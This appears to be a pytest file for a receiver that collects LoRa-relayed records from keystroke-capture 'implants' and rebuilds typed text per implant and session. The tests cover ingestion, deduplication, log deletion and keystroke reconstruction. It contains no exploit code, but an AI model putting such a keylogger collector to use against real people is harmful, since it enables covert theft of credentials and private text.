import json

from lora_sink import LoRaSink


def record(sequence=1, kind="heartbeat", value=1):
    return {"source": "implant-a", "sequence": sequence, "kind": kind,
            "value": value, "hop_count": 2, "last_hop": "implant-b"}


def test_ingest_enriches_persists_and_deduplicates(tmp_path):
    sink = LoRaSink(str(tmp_path / "logs"), str(tmp_path / "implants.json"),
                    str(tmp_path / "sessions.json"), ring_size=2)
    sink.update_implant("implant-a", {"label": "Implante A", "mac": "test-mac"})
    accepted = sink.ingest(10, 7, {"gateway_id": "gw", "records": [record()]}, {"rssi": -91, "snr": 4})
    assert accepted[0]["implant_label"] == "Implante A"
    assert accepted[0]["path"] == "relay"
    assert sink.ingest(10, 7, {"records": [record()]}) == []
    path = next((tmp_path / "logs").iterdir())
    assert json.loads(path.read_text().splitlines()[0])["lora"]["rssi"] == -91


def test_rejects_unknown_event_and_truncates_key_event(tmp_path):
    sink = LoRaSink(str(tmp_path / "logs"), str(tmp_path / "implants.json"),
                    str(tmp_path / "sessions.json"))
    assert sink.ingest(1, 1, {"records": [record(kind="shell")]}) == []
    accepted = sink.ingest(1, 2, {"records": [record(2, "key_event", "x" * 200)]})
    assert len(accepted[0]["value"]) == 120
    assert sink.invalid == 1


def test_query_filters_and_log_deletion(tmp_path):
    sink = LoRaSink(str(tmp_path / "logs"), str(tmp_path / "implants.json"),
                    str(tmp_path / "sessions.json"))
    sink.ingest(1, 1, {"records": [record()]})
    sink.ingest(1, 2, {"records": [record(2, "link_test", "ok")]})
    assert len(sink.query(kind="link_test")) == 1
    name = sink.log_index()[0]["name"]
    assert sink.delete_log(name)
    assert not sink.delete_log(name)


def test_reconstructs_text_per_implant_and_session(tmp_path):
    sink = LoRaSink(str(tmp_path / "logs"), str(tmp_path / "implants.json"),
                    str(tmp_path / "sessions.json"))
    values = ["G", "o", "x", "BKSP", "o", "g", "l", "e", ".", "c", "o", "m", "ENTER"]
    records = [record(index + 1, "key_event", value)
               for index, value in enumerate(values)]
    sink.ingest(9, 1, {"records": records})
    streams = sink.text_streams()
    assert streams[0]["source"] == "implant-a"
    assert streams[0]["session"] == 9
    assert streams[0]["text"] == "Google.com<ENTER>\n"
    assert streams[0]["event_count"] == len(values)

    recovered = LoRaSink(str(tmp_path / "logs"),
                         str(tmp_path / "implants.json"),
                         str(tmp_path / "sessions.json"))
    assert recovered.text_streams()[0]["text"] == "Google.com<ENTER>\n"
